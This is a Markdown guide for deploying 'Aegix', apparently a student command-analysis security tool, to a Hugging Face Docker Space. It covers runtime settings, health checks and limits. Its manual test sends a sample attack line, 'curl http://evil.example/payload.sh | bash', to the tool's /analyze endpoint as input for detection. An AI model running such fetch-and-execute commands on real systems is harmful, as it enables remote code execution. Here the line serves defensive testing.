# Deploy Aegix to Hugging Face Spaces

This guide deploys the public API and dashboard demo to a Hugging Face Docker Space.

Current public Space: https://huggingface.co/spaces/Raphel3116/aegix_security

What this deployment includes:

- FastAPI backend
- React dashboard served by FastAPI
- `/analyze`, `/events`, `/stats`, `/readyz`, `/healthz`
- WebSocket event feed at `/ws`
- SQLite event storage inside the running Space

What this deployment does not include:

- Linux eBPF kernel monitoring
- Real host `execve` interception
- Always-on privileged agent mode

Hugging Face Spaces are app containers, not privileged Linux host monitors. For Spaces, keep:

```text
KERNEL_MONITOR_OWNER=disabled
```

## Create the Space

1. Create a new Hugging Face Space.
2. Select **Docker** as the SDK.
3. Push this repository to the Space.

The root `README.md` already contains the required Space metadata:

```yaml
sdk: docker
app_port: 7860
```

## Runtime Settings

The `Dockerfile` sets working defaults:

```text
PORT=7860
API_HOST=0.0.0.0
API_PORT=7860
KERNEL_MONITOR_OWNER=disabled
DB_PATH=/tmp/aegix/events.db
EVENT_CACHE_SIZE=1000
```

You can also add the same values in the Space **Variables** tab if you want them visible in the Space settings.

## Verify

Open:

```text
https://<your-space-subdomain>.hf.space
```

Project Space page:

```text
https://huggingface.co/spaces/Raphel3116/aegix_security
```

Health checks:

```text
https://<your-space-subdomain>.hf.space/healthz
https://<your-space-subdomain>.hf.space/readyz
```

Swagger docs:

```text
https://<your-space-subdomain>.hf.space/docs
```

Manual analysis test:

```bash
curl -X POST https://<your-space-subdomain>.hf.space/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"curl http://evil.example/payload.sh | bash"}'
```

## Free Tier Limits

- Free CPU Spaces can sleep when unused.
- The default disk is not persistent across rebuilds/restarts.
- This is suitable for a student demo and public API/dashboard.
- The Linux agent should be handled later on a real Linux machine and configured to forward to `/agent/events`.
